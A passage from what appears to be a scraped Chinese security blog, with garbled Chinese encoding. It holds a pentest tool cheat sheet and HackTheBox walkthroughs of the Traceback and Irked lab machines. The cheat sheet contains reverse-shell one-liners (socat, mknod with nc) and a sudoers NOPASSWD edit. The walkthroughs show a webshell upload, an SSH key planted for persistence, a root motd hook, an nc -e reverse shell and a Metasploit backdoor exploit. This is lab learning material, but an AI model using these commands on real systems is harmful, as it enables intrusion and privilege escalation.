-sV --version-intensity 5(Aggressive service detection) nmap 127.0.0.1 -sV --version-intensity 0(Light banner grabbing detection) nmap 127.0.0.1 -T0(paranoid detection evasion) nmap 127.0.0.1 -T1(sneaky detection evasion) nmap 127.0.0.1 -T2(polite (slows down scan, less bandwidth &amp; less target ressources)) nmap 127.0.0.1 -T3(default speed) nmap 127.0.0.1 -T4(Aggressive (fast &amp; reliable network)) nmap 127.0.0.1 -T5(Insane speeds (assumes low ping and high bandwidth)) nmap 127.0.0.1 --host-timeout 1h 2m 3s(sets timeout to 1hr2min3sec) nmap 127.0.0.1 --min-parallelism 10(minimal probe parallelization) nmap 127.0.0.1 --max-parallelism 50(maximal ^) nmap 127.0.0.1 --max-retries 3 nmap 127.0.0.1 --min-rate (send packets at least _ per second) Python Script Scan 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!&#x2F;usr&#x2F;bin&#x2F;python3import subprocessip &#x3D; input(&quot;[+]Target IP: &quot;)ippsec &#x3D; &quot;ippsec_scan.txt&quot;service &#x3D; &quot;service_scan.txt&quot;script &#x3D; &quot;script_scan.txt&quot;all_tcp &#x3D; &quot;all_tcp_scan.txt&quot;all_udp &#x3D; &quot;all_tcp_scan.txt&quot;def ippsec_scan(ip): print(&quot;[!] Starting ippsec_scan &quot;) subprocess.run([&quot;nmap&quot;, &quot;-sC&quot;, &quot;-sV&quot;, &quot;-oN&quot;, ippsec, ip]) print(&quot;[+] Done &quot;)def service_scan(ip): print(&quot;[!] Starting service_scan &quot;) subprocess.run([&quot;nmap&quot;, &quot;-A&quot;, &quot;-p-&quot;, &quot;-oN&quot;, service, ip]) print(&quot;[+] Done &quot;)def script_scan(ip): print(&quot;[!] Starting script_scan &quot;) subprocess.run([&quot;nmap&quot;, &quot;--script&quot;, &quot;discovery, safe, vuln&quot;, &quot;-oN&quot;, script, ip]) print(&quot;[+] Done &quot;)def alltcp_scan(ip): print(&quot;[!] Starting all_tcp_scan &quot;) subprocess.run([&quot;nmap&quot;, &quot;-p-&quot;, &quot;-oN&quot;, all_tcp, ip]) print(&quot;[+] Done &quot;)def alludp_scan(ip): print(&quot;[!] Starting all_udp_scan &quot;) subprocess.run([&quot;nmap&quot;, &quot;-p-&quot;, &quot;-sU&quot;, &quot;-oN&quot;, all_udp, ip]) print(&quot;[+] Done &quot;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: ippsec_scan(ip) service_scan(ip) script_scan(ip) alltcp_scan(ip) alludp_scan(ip) Netdiscover Nikto é¡¹ç›®åœ°å€ï¼šhttps://github.com/sullo/nikto å·¥å…·ä»‹ç»ï¼šperlè¯­è¨€å¼€å‘çš„å¼€æºWEBå®‰å…¨æ‰«æå™¨ï¼›è¯†åˆ«ç½‘ç«™è½¯ä»¶ç‰ˆæœ¬ï¼›æœç´¢å­˜åœ¨å®‰å…¨éšæ‚£çš„æ–‡ä»¶ï¼›æ£€æŸ¥æœåŠ¡å™¨é…ç½®æ¼æ´ï¼›æ£€æŸ¥WEB Applicationå±‚é¢çš„å®‰å…¨éšæ‚£ï¼›é¿å…404è¯¯åˆ¤ä¾æ®å“åº”æ–‡ä»¶å†…å®¹åˆ¤æ–­ï¼Œä¸åŒæ‰©å±•åçš„æ–‡ä»¶404å“åº”å†…å®¹ä¸åŒã€‚ å¸¸ç”¨å‘½ä»¤ï¼š 12345678Nikto -host http:&#x2F;&#x2F;1.1.1.1 #æ‰«æç›®æ ‡ï¼šåŸŸåæ–¹å¼ï¼›Nikto -host http:&#x2F;&#x2F;1.1.1.1 -output #æ‰«æå¹¶è¾“å‡ºç»“æœNikto -host 1.1.1.1 -port 80 #æ‰«æç›®æ ‡ï¼šipåœ°å€åŠ ç«¯å£å·Nikto -host www.baidu.com -port 443 -ssl #æ‰«æhttpsç½‘ç«™Nikto -host æ–‡ä»¶å.txt #æ‰¹é‡æ‰«æç›®æ ‡nmap -p80 192.168.1.0&#x2F;24 -oG - | nikto -host - #åˆ©ç”¨nmapæ‰«æå¼€æ”¾80ç«¯å£çš„IPæ®µå¹¶ä¸”oGï¼ˆnmapç»“æœè¾“å‡ºå¹¶æ•´ç†ï¼‰é€šè¿‡ç®¡é“çš„æ–¹å¼â€œ|â€ç”¨niktoè¿›è¡Œæ‰«ænikto -host 192.168.0.1 -useproxy http:&#x2F;&#x2F;localhost:8070 #åˆ©ç”¨ä»£ç†è¿›è¡Œæ‰«æ-vhost #å½“ä¸€ä¸ªç½‘ç«™å­˜åœ¨å¤šä¸ªç«¯å£æ—¶å¯ä»¥ä½¿ç”¨-vhostéå†æ‰€æœ‰ç½‘ç«™è¿›è¡Œæ‰«ææˆ–ä¸€ä¸ªipå¯¹åº”å¤šä¸ªç½‘ç«™ GitHack é¡¹ç›®åœ°å€ï¼šhttps://github.com/lijiejie/GitHack å·¥å…·ä»‹ç»ï¼šGitHackæ˜¯ä¸€ä¸ª.gitæ³„éœ²åˆ©ç”¨è„šæœ¬ï¼Œé€šè¿‡æ³„éœ²çš„.gitæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼Œé‡å»ºè¿˜åŸå·¥ç¨‹æºä»£ç ã€‚ æ¸—é€æµ‹è¯•äººå‘˜ã€æ”»å‡»è€…ï¼Œå¯ä»¥è¿›ä¸€æ­¥å®¡è®¡ä»£ç ï¼ŒæŒ–æ˜ï¼šæ–‡ä»¶ä¸Šä¼ ï¼ŒSQLæ³¨å°„ç­‰webå®‰å…¨æ¼æ´ã€‚ dirb Wfuzz é¡¹ç›®åœ°å€ï¼šhttps://wfuzz.readthedocs.io/en/latest/ å·¥å…·ä»‹ç»ï¼šwfuzzæ˜¯ä¸€ä¸ªåŸºäºPythonçš„Webçˆ†ç ´ç¨‹åºï¼Œå®ƒæ”¯æŒå¤šç§æ–¹æ³•æ¥æµ‹è¯•WEBåº”ç”¨çš„æ¼æ´ã€‚ä½ å¯ä»¥å®¡è®¡å‚æ•°ã€ç™»å½•è®¤è¯ã€GET/POSTæ–¹å¼çˆ†ç ´çš„è¡¨å•ï¼Œå¹¶ä¸”å¯ä»¥å‘æ˜æœªå…¬å¼€çš„èµ„æºï¼Œæ¯”å¦‚ç›®å½•ã€æ–‡ä»¶å’Œå¤´éƒ¨ä¹‹ç±»çš„ã€‚ ä½¿ç”¨æ‰‹å†Œï¼šhttps://www.fuzzer.xyz/2019/03/29/WFUZZä½¿ç”¨æ•™ç¨‹/ subDomainBrute é¡¹ç›®åœ°å€ï¼šhttps://github.com/lijiejie/subDomainsBrute å·¥å…·ä»‹ç»ï¼šæœ¬å·¥å…·ç”¨äºæ¸—é€æµ‹è¯•ç›®æ ‡åŸŸåæ”¶é›†ã€‚é«˜å¹¶å‘DNSæš´åŠ›æšä¸¾ï¼Œå‘ç°å…¶ä»–å·¥å…·æ— æ³•æ¢æµ‹åˆ°çš„åŸŸå, å¦‚Googleï¼Œaizhanï¼Œfofaã€‚ Pigat é¡¹ç›®åœ°å€ï¼šhttps://github.com/teamssix/pigat å·¥å…·ä»‹ç»ï¼šè¢«åŠ¨ä¿¡æ¯æ”¶é›†èšåˆå·¥å…·ï¼Œè¯¥å·¥å…·é€šè¿‡çˆ¬å–ç›®æ ‡URLåœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™æ¯”å¦‚å¤‡æ¡ˆæŸ¥è¯¢ç½‘ç«™ã€å­åŸŸåæŸ¥è¯¢ç½‘ç«™çš„ç»“æœæ¥å¯¹ç›®æ ‡è¿›è¡Œè¢«åŠ¨ä¿¡æ¯æ”¶é›†ã€‚ å¯†ç çˆ†ç ´ hash-identifier é¡¹ç›®åœ°å€ï¼šhttps://tools.kali.org/password-attacks/hash-identifier å·¥å…·ä»‹ç»ï¼šhash-identifieræ˜¯ä¸€æ¬¾å“ˆå¸Œç®—æ³•è¯†åˆ«å·¥å…·ã€‚é€šè¿‡è¯¥å·¥å…·ï¼Œç”¨æˆ·å¯ä»¥è¯†åˆ«å“ˆå¸Œå€¼æ‰€ä½¿ç”¨çš„å“ˆå¸Œç®—æ³•ã€‚ hashcat John The Ripper é¡¹ç›®åœ°å€ï¼šhttps://www.openwall.com/john/ ä½¿ç”¨ç¤ºä¾‹ï¼š 1&#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; id_rsa.hash 1john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt id_rsa.hash Hydra é¡¹ç›®åœ°å€ï¼šhttps://tools.kali.org/password-attacks/hydra å·¥å…·ä»‹ç»ï¼šè¿™æ¬¾æš´åŠ›å¯†ç ç ´è§£å·¥å…·ç›¸å½“å¼ºå¤§ï¼Œæ”¯æŒå‡ ä¹æ‰€æœ‰åè®®çš„åœ¨çº¿å¯†ç ç ´è§£ï¼Œå…¶å¯†ç èƒ½å¦è¢«ç ´è§£å…³é”®åœ¨äºå­—å…¸æ˜¯å¦è¶³å¤Ÿå¼ºå¤§ã€‚ è¯¦ç»†ä½¿ç”¨æ–¹å¼ï¼šhttps://www.cnblogs.com/zhaijiahui/p/8371336.html ä½¿ç”¨ç¤ºä¾‹ï¼š Webç™»å½• GETæ–¹å¼ 1hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -vV -e ns ip http-get &#x2F;admin&#x2F; 1hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -vV -e ns -f ip http-get &#x2F;admin&#x2F;index.php Webç™»å½• POSTæ–¹å¼ https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/ æ•°å­—å–è¯ Steghide ä½¿ç”¨æ‰‹å†Œï¼šhttp://steghide.sourceforge.net/documentation/manpage.php å¸¸ç”¨å‘½ä»¤ï¼š éšå†™ï¼š 1$ steghide embed -cf picture.jpg -ef secret.txt æå–ï¼š 1$ steghide extract -sf picture.jpg exiftool é¡¹ç›®åœ°å€ï¼šhttps://github.com/exiftool/exiftool ä½¿ç”¨æ‰‹å†Œï¼šhttps://www.jianshu.com/p/d76457799de1 ææƒè„šæœ¬ LinEnum é¡¹ç›®åœ°å€ï¼šhttps://github.com/rebootuser/LinEnum ä½¿ç”¨ç¤ºä¾‹ï¼š./LinEnum.sh -s -k keyword -r report -e /tmp/ -t å‚æ•°ï¼š -k Enter keyword -e Enter export location -t Include thorough (lengthy) tests -s Supply current user password to check sudo perms (INSECURE) -r Enter report name -h Displays this help text Running with no options = limited scans/no output file -e Requires the user enters an output location i.e. /tmp/export. If this location does not exist, it will be created. -r Requires the user to enter a report name. The report (.txt file) will be saved to the current working directory. -t Performs thorough (slow) tests. Without this switch default â€˜quickâ€™ scans are performed. -s Use the current user with supplied password to check for sudo permissions - note this is insecure and only really for CTF use! -k An optional switch for which the user can search for a single keyword within many files (documented below). pspy é¡¹ç›®åœ°å€ï¼šhttps://github.com/DominicBreuker/pspy é¡¹ç›®ä»‹ç»ï¼špspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea. ææƒå‘½ä»¤ Find World Writable Folders 1find &#x2F; -xdev -type d -perm -0002 -ls 2&gt; &#x2F;dev&#x2F;null Find World Writable Files 1find &#x2F; -xdev -type f -perm -0002 -ls 2&gt; &#x2F;dev&#x2F;null Find SUIDs 1find &#x2F; -perm -4000 -user root -exec ls -ld &#123;&#125; \\; 2&gt; &#x2F;dev&#x2F;null Find SGID 1find &#x2F; -perm -2000 -group root -exec ls -ld &#123;&#125; \\; 2&gt; &#x2F;dev&#x2F;null DIstro Information 1cat &#x2F;etc&#x2F;*-release Check open ports 1netstat -antup Check processes 1ps -elf Process monitoring tool: pspy Useful for monitoring chron jobs or any other scheduled jobs Check processes running with root privileges 1ps -elf | grep root Check running services 1cat &#x2F;etc&#x2F;services Check installed packages 12dpkg -lrpm -qa Check for sudo permissions 1sudo -l Check OS architecture 1uname -a Check cronjobs 1cat &#x2F;etc&#x2F;cron* Check fstab 1cat &#x2F;etc&#x2F;fstab Check network configuration 1ip addr Check contents of /etc/passwd 1cat &#x2F;etc&#x2F;passwd Using socat Listen 1$ socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 Connect 1$ socat file:&#96;tty&#96;,raw,echo&#x3D;0 tcp-listen:4444 Reverse connection using mknod 1mknod &#x2F;tmp&#x2F;backpipe p; &#x2F;bin&#x2F;sh 0&lt; &#x2F;tmp&#x2F;backpipe | nc &lt;ip&gt; &lt;port&gt; 1&gt; &#x2F;tmp&#x2F;backpipe; rm &#x2F;tmp&#x2F;backpipe Check version of an installed application 1dpkg -l &lt;application name&gt; Sometimes checking /opt /tmp /var /usr might help. Edit sudoers file and grant sudo access to the current user (www-data in this case) with no password 1echo &quot;www-data ALL&#x3D;NOPASSWD: ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers &amp;&amp; chmod 440 &#x2F;etc&#x2F;sudoers Reverse Shell http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet å¸¸ç”¨å·¥å…· SQLMAP https://zerokeeper.com/web-security/sqlmap-usage-summary.html# https://louisnie.github.io/2019/03/03/SQLMAP/","tags":[{"name":"Linux Enumeration","slug":"Linux-Enumeration","permalink":"http://ca0y1h.top/tags/Linux-Enumeration/"}],"categories":[{"name":"æŠ€æœ¯éšç¬”","slug":"æŠ€æœ¯éšç¬”","permalink":"http://ca0y1h.top/categories/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"}]},{"title":"HTB::Traceback Walkthrough","date":"2020-03-24T14:08:57.000Z","path":"Target_drone/HackTheBox/10.HTB-Traceback-walkthrough/","text":"HTB::Traceback Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap pspy gtfobins OSINT SSH with public key 0x03 Pentesting Initial Enumeration nmap scan 1234567891011121314151617# Nmap 7.80 scan initiated Mon Mar 23 10:20:21 2020 as: nmap -sC -sV -oN ippsec_scan.txt 10.10.10.181Nmap scan report for 10.10.10.181Host is up (0.37s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)| 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)|_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: Help usService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .# Nmap done at Mon Mar 23 10:21:10 2020 -- 1 IP address (1 host up) scanned in 49.24 seconds Meanwhile, I ran gobuster and dirb But there is anything interesting for me. Getting User Access 80 HTTP Website Hintï¼šSome of the best web shells that you might need ;)ï¼Œ Google it Found a Github repo Test all webshell filename for url smevk.php webshell works, and username is admin, password is admin. Upload php reverse shell script through Code Injector module. Now I can get a php reverse shell 123456789101112131415161718192021$ nc -lvvp 4444listening on [any] 4444 ...10.10.10.181: inverse host lookup failed: Unknown hostconnect to [10.10.16.99] from (UNKNOWN) [10.10.10.181] 33430&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off$ iduid&#x3D;1000(webadmin) gid&#x3D;1000(webadmin) groups&#x3D;1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)$ cd &#x2F;home&#x2F;webadmin$ ls -latotal 44drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 .drwxr-xr-x 4 root root 4096 Aug 25 2019 ..-rw------- 1 webadmin webadmin 105 Mar 16 04:03 .bash_history-rw-r--r-- 1 webadmin webadmin 220 Aug 23 2019 .bash_logout-rw-r--r-- 1 webadmin webadmin 3771 Aug 23 2019 .bashrcdrwx------ 2 webadmin webadmin 4096 Aug 23 2019 .cachedrwxrwxr-x 3 webadmin webadmin 4096 Aug 24 2019 .local-rw-rw-r-- 1 webadmin webadmin 1 Aug 25 2019 .luvit_history-rw-r--r-- 1 webadmin webadmin 807 Aug 23 2019 .profiledrwxrwxr-x 2 webadmin webadmin 4096 Feb 27 06:29 .ssh-rw-rw-r-- 1 sysadmin sysadmin 122 Mar 16 03:53 note.txt åœ¨webadminçš„ä¸»ç›®å½•ä¸»è¦çœ‹ä¸¤ä¸ªæ–‡ä»¶note.txtå’Œ.bash_history 123456789101112$ cat note.txt- sysadmin -I have left a tool to practice Lua.I&#39;m sure you know where to find it.Contact me if you have any question.$ cat .bash_historyls -lasudo -lnano privesc.luasudo -u sysadmin &#x2F;home&#x2F;sysadmin&#x2F;luvit privesc.lua rm privesc.lualogout åº”è¯¥æ˜¯åˆ©ç”¨/home/sysadmin/luvitè¿™ä¸ªå·¥å…·æ‰§è¡Œluaè„šæœ¬ï¼Œå¯ä»¥å†æ–°å»ºä¸€ä¸ªprivesc.luaè„šæœ¬ï¼Œç„¶åæ¨¡ä»¿.bash_historyæ‰§è¡Œå‘½ä»¤ 123456789101112$ echo &#39;os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; &gt; privesc.lua$ cat privesc.luaos.execute(&quot;&#x2F;bin&#x2F;sh&quot;)$sudo -u sysadmin &#x2F;home&#x2F;sysadmin&#x2F;luvit privesc.luash: turning off NDELAY mode$ iduid&#x3D;1001(sysadmin) gid&#x3D;1001(sysadmin) groups&#x3D;1001(sysadmin)cd &#x2F;home&#x2F;sysadmin lsluvituser.txt Get user flag~ Getting Root Access çœ‹äº†ä¸€ä¸‹HTB Forumä¸Šé¢ä¸€äº›å¸ˆå‚…ç»™çš„æç¤ºï¼Œç”¨pspyå·¥å…·ç›‘è§†ç³»ç»Ÿä¸­åœ¨æ‰§è¡Œçš„ç¨‹åºï¼Œå‘ç°äº†ä¸€ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ï¼š 123456789101112132020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0 PID&#x3D;2273 | sleep 30 2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0 PID&#x3D;2272 | &#x2F;bin&#x2F;sh -c sleep 30 ; &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;* &#x2F;etc&#x2F;update-motd.d&#x2F; 2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0 PID&#x3D;2271 | 2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0 PID&#x3D;2270 | &#x2F;usr&#x2F;sbin&#x2F;CRON -f 2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0 PID&#x3D;2269 | &#x2F;usr&#x2F;sbin&#x2F;CRON -f 2020&#x2F;03&#x2F;23 21:11:31 CMD: UID&#x3D;0 PID&#x3D;2275 | &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;00-header &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;10-help-text &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;50-motd-news &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;80-esm &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;91-release-upgrade &#x2F;etc&#x2F;update-motd.d&#x2F; 2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0 PID&#x3D;2281 | sleep 30 2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0 PID&#x3D;2278 | &#x2F;bin&#x2F;sh -c sleep 30 ; &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;* &#x2F;etc&#x2F;update-motd.d&#x2F; 2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0 PID&#x3D;2277 | 2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0 PID&#x3D;2276 | &#x2F;usr&#x2F;sbin&#x2F;CRON -f 2020&#x2F;03&#x2F;23 21:12:32 CMD: UID&#x3D;0 PID&#x3D;2282 | &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;00-header &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;10-help-text &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;50-motd-news &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;80-esm &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;91-release-upgrade &#x2F;etc&#x2F;update-motd.d&#x2F; å¯ä»¥çœ‹åˆ°ç³»ç»Ÿæ¯éš”30ç§’å°±æŠŠ/var/backups/.update-motd.d/ä¸­çš„æ–‡ä»¶éƒ½å¤åˆ¶åˆ°/etc/update-motd.d/ï¼ŒGoogleä¸€ä¸‹update-motd.dçš„ä½œç”¨ï¼Œå‘ç°æ˜¯æ¯æ¬¡SSHç™»å½•æˆåŠŸåï¼Œä¼šæ‰§è¡Œ00-headeræ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚ç°åœ¨çš„é—®é¢˜å°±æ˜¯æ€ä¹ˆç”¨SSHç™»å½•é¶æœºï¼Œæˆ‘æ‰¾äº†å¾ˆä¹…SSHçš„ç™»å½•å¯†ç ï¼Œåæ¥æ‰çªç„¶æƒ³åˆ°SSHé™¤äº†å£ä»¤ç™»å½•è¿˜å¯ä»¥å…¬é’¥ç™»å½•ï¼ŒæŠŠæœ¬æœºä¸Šçš„å…¬é’¥æ‹·è´åˆ°é¶æœºçš„/home/webadmin/.ssh/authorized_keysæ–‡ä»¶ä¸­å³å¯ã€‚ é¡ºä¾¿æŠŠSSHçš„åŸç†å¤ä¹ ä¸€ä¸‹ï¼šhttps://www.jianshu.com/p/33461b619d53 é¶æœº 123456$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6zGx1XQHjBj5x5D+qqE+0wml2VnALfbz7D5CpexgNrpEDQTOWCEkIAl1Ftt9FNClzdNk+&#x2F;NFMWXR8dxRHzOl7aQzMa+njQOzh6VyM34YbCGuGgakDCIrsHu25dAwypvJ7Clp22faDDIw6zJxcx84Ir1XSpUeWZ4Cotk+0gVzwgLHbstRPxyzxROvcsesx9kd251L3&#x2F;bWJzC53oNDaSXzMBYV7sdjSlPLeD9zHJ39wr5YaEFwn0vkgPR+VAdlXAOLi98Ttr+FYMsGr8XMbJU06QKZ2ozf6RVjc6RJ5hjgIFbcxV8VCNGM6rBx5FDCZDgnbzu4ITWpWsgBBLu3JndjD+UWkeejLE4K7eR3510W&#x2F;x4zHF&#x2F;0TsZicyh&#x2F;ZJbZEo+JefvVKT0WAilaJ2K7w7jDkrPhZO6TheGTDnvLqrEvHObGq70ytpZ6ippsm78&#x2F;xkwCHu4l03RMd2Zt+7elXOsA&#x2F;4WsjEvS+CxqlbtTC636+T6T4cTro2GHlO3lAq7oddq0&#x3D; kali@kali &gt;&gt; &#x2F;home&#x2F;webadmin&#x2F;.ssh&#x2F;authorized_keys$ cd &#x2F;etc&#x2F;update-motd.d&#x2F;$ echo &quot;cat &#x2F;root&#x2F;root.txt&quot; &gt;&gt; 00-header ä¸»æœºï¼ˆè¿™ä¸¤ä¸ªæ­¥éª¤è¡”æ¥è¦å¿«ï¼‰ 12345678910$ ssh -i id_rsa webadmin@10.10.10.181#################################-------- OWNED BY XH4H ---------- I guess stuff could have been configured better ^^ -#################################Welcome to Xh4H landcf6c[---------------------------]aefcLast login: Mon Mar 16 03:50:24 2020 from 10.10.14.2 Get root flag~ å¦å¤–ï¼Œè¿˜å¯ä»¥åœ¨91-release-upgradeå†™ä¸€ä¸ªreverse shellï¼š 123456789#!&#x2F;bin&#x2F;sh&#x2F;tmp&#x2F;nc -e &#x2F;bin&#x2F;bash 10.10.14.194 2345# if the current release is under development there won&#39;t be a new oneif [ &quot;$(lsb_release -sd | cut -d&#39; &#39; -f4)&quot; &#x3D; &quot;(development&quot; ]; then exit 0fiif [ -x &#x2F;usr&#x2F;lib&#x2F;ubuntu-release-upgrader&#x2F;release-upgrade-motd ]; then exec &#x2F;usr&#x2F;lib&#x2F;ubuntu-release-upgrader&#x2F;release-upgrade-motdfi 0x04 Conclusion 0x05 Reference https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/ https://github.com/DominicBreuker/pspy https://gtfobins.github.io/gtfobins/lua/","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"é¶æœº/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::Irked Walkthrough","date":"2020-03-24T14:08:38.000Z","path":"Target_drone/HackTheBox/9.HTB-Irked-walkthrough/","text":"HTB::Irked Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap steghide metaspolit 0x03 Pentesting Initial Enumeration nmap scan ports 123456789101112131415161718192021222324252627282930313233$ nmap -sC -sV -p- 10.10.10.117 Nmap scan report for 10.10.10.117Host is up (0.23s latency).Not shown: 65528 filtered portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)| 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)| 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)|_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)80&#x2F;tcp open http Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache&#x2F;2.4.10 (Debian)|_http-title: Site doesn&#39;t have a title (text&#x2F;html).111&#x2F;tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port&#x2F;proto service| 100000 2,3,4 111&#x2F;tcp rpcbind| 100000 2,3,4 111&#x2F;udp rpcbind| 100000 3,4 111&#x2F;tcp6 rpcbind| 100000 3,4 111&#x2F;udp6 rpcbind| 100024 1 39065&#x2F;tcp6 status| 100024 1 47673&#x2F;udp status| 100024 1 49431&#x2F;tcp status|_ 100024 1 56811&#x2F;udp6 status6697&#x2F;tcp open irc UnrealIRCd8067&#x2F;tcp open irc UnrealIRCd49431&#x2F;tcp open status 1 (RPC #100024)65534&#x2F;tcp open irc UnrealIRCdService Info: Host: irked.htb; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 1762.08 seconds website home page Getting User Access search UnrealIRCd through msf 123456789101112131415161718192021222324252627282930313233343536373839404142434445msf5 &gt; search UnrealIRCdMatching Modules&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor 2010-06-12 excellent No UnrealIRCD 3.2.8.1 Backdoor Command Execution msf5 &gt; use exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoormsf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; show optionsModule options (exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 6667 yes The target port (TCP)Exploit target: Id Name -- ---- 0 Automatic Targetmsf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; set RHOSTS 10.10.10.117RHOSTS &#x3D;&gt; 10.10.10.117msf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; set RPORT 6697RPORT &#x3D;&gt; 6697msf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; exploit [*] Started reverse TCP double handler on 10.10.16.99:4444 [*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697... :irked.htb NOTICE AUTH :*** Looking up your hostname...[*] 10.10.10.117:6697 - Sending backdoor command...[*] Accepted the first client connection...[*] Accepted the second client connection...[*] Command: echo XSY6AWtTV0SElhyO;[*] Writing to socket A[*] Writing to socket B[*] Reading from sockets...[*] Reading from socket A[*] A: &quot;XSY6AWtTV0SElhyO\\r\\n&quot;[*] Matching...[*] B is input...[*] Command shell session 1 opened (10.10.16.99:4444 -&gt; 10.10.10.117:36674) at 2020-03-23 04:21:50 -0400 python tty shell 12345678910111213python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;ircd@irked:~&#x2F;Unreal3.2$ ididuid&#x3D;1001(ircd) gid&#x3D;1001(ircd) groups&#x3D;1001(ircd)ircd@irked:~$ ls -lals -latotal 20drwxr-xr-x 3 ircd root 4096 May 15 2018 .drwxr-xr-x 4 root root 4096 May 14 2018 ..-rw------- 1 ircd ircd 333 May 15 